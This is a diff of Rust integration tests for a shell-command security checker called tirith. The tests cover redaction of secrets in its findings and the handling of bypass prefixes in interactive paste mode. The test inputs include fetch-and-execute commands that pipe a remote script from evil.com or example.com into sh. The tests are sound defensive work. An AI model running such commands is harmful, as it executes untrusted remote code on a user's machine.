@@ -143,6 +143,32 @@ fn check_json_output() {
 }
 
 #[test]
+fn check_json_output_redacts_assignment_values_in_findings() {
+    let out = tirith()
+        .args([
+            "check",
+            "--shell",
+            "posix",
+            "--interactive",
+            "--json",
+            "--",
+            "OPENAI_API_KEY=sk-secret curl https://evil.com | sh",
+        ])
+        .output()
+        .expect("failed to run tirith");
+    assert_eq!(out.status.code(), Some(1));
+    let stdout = String::from_utf8_lossy(&out.stdout);
+    assert!(
+        !stdout.contains("sk-secret"),
+        "JSON output should not contain raw secret values: {stdout}"
+    );
+    assert!(
+        stdout.contains("OPENAI_API_KEY=[REDACTED]"),
+        "JSON output should scrub assignment values: {stdout}"
+    );
+}
+
+#[test]
 fn check_json_clean_output() {
     let out = tirith()
         .args(["check", "--shell", "posix", "--json", "--", "echo hello"])
@@ -251,7 +277,7 @@ fn paste_inline_bypass_requires_interactive_mode() {
 }
 
 #[test]
-fn paste_inline_bypass_honored_with_interactive_flag() {
+fn paste_inline_bypass_not_honored_with_interactive_flag() {
     use std::io::Write;
     let mut child = tirith()
         .args(["paste", "--shell", "posix", "--interactive"])
@@ -269,13 +295,13 @@ fn paste_inline_bypass_honored_with_interactive_flag() {
     let out = child.wait_with_output().unwrap();
     assert_eq!(
         out.status.code(),
-        Some(0),
-        "interactive paste should honor TIRITH=0 bypass"
+        Some(1),
+        "interactive paste should not honor pasted TIRITH=0 prefixes"
     );
 }
 
 #[test]
-fn paste_env_wrapper_bypass_honored_with_interactive_flag() {
+fn paste_env_wrapper_bypass_not_honored_with_interactive_flag() {
     use std::io::Write;
     let mut child = tirith()
         .args(["paste", "--shell", "posix", "--interactive"])
@@ -293,8 +319,33 @@ fn paste_env_wrapper_bypass_honored_with_interactive_flag() {
     let out = child.wait_with_output().unwrap();
     assert_eq!(
         out.status.code(),
+        Some(1),
+        "interactive paste should not honor pasted env TIRITH=0 prefixes"
+    );
+}
+
+#[test]
+fn paste_process_level_bypass_still_honored_with_interactive_flag() {
+    use std::io::Write;
+    let mut child = tirith()
+        .env("TIRITH", "0")
+        .args(["paste", "--shell", "posix", "--interactive"])
+        .stdin(std::process::Stdio::piped())
+        .spawn()
+        .expect("failed to spawn tirith");
+
+    child
+        .stdin
+        .take()
+        .unwrap()
+        .write_all(b"curl -LsSf https://example.com/install.sh | sh")
+        .unwrap();
+
+    let out = child.wait_with_output().unwrap();
+    assert_eq!(
+        out.status.code(),
         Some(0),
-        "interactive paste should honor env TIRITH=0 bypass"
+        "interactive paste should still honor process-level TIRITH=0 bypass"
     );
 }
 
@@ -344,6 +395,56 @@ fn why_no_trigger() {
         out.status.code() == Some(0) || out.status.code() == Some(1),
         "why should exit 0 or 1"
     );
+}
+
+#[test]
+fn check_last_trigger_redacts_assignment_values_in_findings() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let out = tirith()
+        .env("XDG_DATA_HOME", dir.path())
+        .env("APPDATA", dir.path())
+        .args([
+            "check",
+            "--shell",
+            "posix",
+            "--interactive",
+            "--",
+            "OPENAI_API_KEY=sk-secret curl https://evil.com | sh",
+        ])
+        .output()
+        .expect("failed to run tirith");
+    assert_eq!(out.status.code(), Some(1));
+
+    let last_trigger_path = dir.path().join("tirith").join("last_trigger.json");
+    let contents =
+        fs::read_to_string(&last_trigger_path).expect("last_trigger.json should be written");
+    assert!(
+        !contents.contains("sk-secret"),
+        "last_trigger.json should not contain raw secret values: {contents}"
+    );
+    assert!(
+        contents.contains("OPENAI_API_KEY=[REDACTED]"),
+        "last_trigger.json should scrub assignment values: {contents}"
+    );
+}
+
+#[test]
+fn check_wrapped_tirith_run_preserves_sink_rules() {
+    for command in [
+        "env tirith run http://example.com",
+        "command tirith run http://example.com",
+        "time tirith run http://example.com",
+    ] {
+        let out = tirith()
+            .args(["check", "--shell", "posix", "--", command])
+            .output()
+            .expect("failed to run tirith");
+        assert_eq!(
+            out.status.code(),
+            Some(1),
+            "wrapped tirith run should trigger sink rules: {command}"
+        );
+    }
 }
 
 // ─── init subcommand ───
